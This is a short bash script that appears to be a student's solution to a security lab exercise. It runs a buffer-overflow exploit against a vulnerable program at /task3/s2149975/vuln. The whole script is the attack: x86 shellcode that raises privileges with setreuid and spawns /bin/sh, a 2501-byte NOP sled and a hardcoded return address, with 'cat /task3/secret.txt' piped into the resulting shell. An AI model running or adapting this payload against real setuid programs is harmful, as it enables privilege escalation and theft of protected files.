#!/usr/bin/env bash
SHELLCODE='\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68n/sh\x68//bi\x89\xe3\x89\xd1\xcd\x80'

#nopadd start = 0xffffc93e + 1134(in B16) + 2500

nopAdd='\x70\xd7\xff\xff'

buffer=$(printf "\x90%.0s" {1..2501})
	
echo /bin/cat /task3/secret.txt | env -i \
	/task3/s2149975/vuln "$(printf $nopAdd$buffer$SHELLCODE)" 1166
	
